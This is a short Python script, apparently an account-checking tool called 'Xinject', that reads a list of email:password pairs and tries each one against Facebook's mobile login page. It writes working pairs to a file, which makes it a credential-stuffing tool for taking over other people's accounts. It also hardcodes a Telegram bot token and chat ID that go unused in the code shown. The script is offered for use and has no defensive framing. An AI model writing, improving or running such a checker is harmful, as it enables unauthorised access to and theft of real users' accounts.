import requests,os,time
from pyfiglet import Figlet
os.system('clear')
gr = '\033[92m'
rd = '\033[91m'
wh = '\033[97m'
lg = '''
>>> Xinject Coder 



    ██╗  ██╗██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗
    ╚██╗██╔╝██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝
     ╚███╔╝ ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   
     ██╔██╗ ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   
    ██╔╝ ██╗██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   
    ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   

                Author : Xinject
'''
#fig = Figlet(font='slant')
#print(fig.renderText('slaw'))
Tok = '5305568274:AAHmWXG1ok_5phl9gg7ErrEFXN5juBTmcm0'
ID = '5366201410'
file = input('Path List : ')
Xinject = open(file, 'r')

while True:
    os.system('clear')
    print(lg)
    time.sleep(0.5)
    user = Xinject.readline().split('\n')[0]
    eml = user.split(':')[0]
    pw = user.split(':')[1]
    
    url = 'https://mobile.facebook.com/login.php'

    headers = {
        'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B',
        'Accept-Language' : 'en-US,en;q=0.5'}
    data = {'email': eml,'pass': pw}

    login = requests.post(url,headers=headers,data=data).text
    if "xc_message" in login:
        print(gr+f'Good : {eml}{pw}'+wh)
        with open('GOOD.txt','a') as hell:
            hell.write(f'{eml}:{pw}\n')
            hell.close()
    elif "checkpointSubmitButton-actual-button" in login:
        print(rd+f'Bad : {eml}{pw}'+wh)
    else:
        print('Error Login...')
        pass
